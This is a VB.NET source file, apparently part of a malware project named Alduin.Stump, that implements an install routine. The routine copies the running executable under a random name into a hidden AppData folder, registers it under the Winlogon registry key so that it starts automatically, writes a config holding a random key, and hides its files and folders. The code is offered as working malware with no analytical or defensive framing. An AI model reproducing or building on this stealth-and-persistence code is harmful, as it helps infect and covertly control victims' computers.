Imports System.IO
Imports System.Text
Imports Alduin.Stump.Alduin.Stump.Models
Imports Alduin.Stump.Alduin.Stump.Moduls.IO
Imports Newtonsoft.Json

Module Installing
    Public Sub Install()
        If Not File.Exists(GetPathes.get_JsonFilewithPath()) Then
            Dim main_file As String = Process.GetCurrentProcess().MainModule.ModuleName
            Dim installPath As String = getAppdata() & "\" & RandomString(5, 8)
            Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
            IOModule.CreateDirectory(installPath)
            System.IO.File.Copy(main_file, installPath & "\" & Re_Named_Main_file)
            Dim ExeptFiles As New ArrayList
            ExeptFiles.Add(Re_Named_Main_file)
            Copy_filesExept(installPath, ExeptFiles)
            Copy_directories(installPath)
            StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & main_file)
            Dim config As New Config
            config.Key = RandomString(10, 10)
            config.MainFileName = Re_Named_Main_file
            config.MainPath = installPath
            Dim jsonString As String = JsonConvert.SerializeObject(config)
            IOModule.Write_file(GetPathes.get_JsonFilewithPath(), jsonString)
            HidderModule.Hide_files(installPath)
            HidderModule.Hide_directories(installPath)
        End If
    End Sub
    Private Function RandomString(ByVal min As Integer, ByVal max As Integer) As String
        Dim r As Random = New Random
        Dim characters As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        Dim sb As New StringBuilder
        Dim randomLength As Integer = r.Next(min, max)
        For i As Integer = 1 To randomLength
            Dim index As Integer = r.Next(0, characters.Length)
            sb.Append(characters.Substring(index, 1))
        Next
        Return sb.ToString()
    End Function

End Module

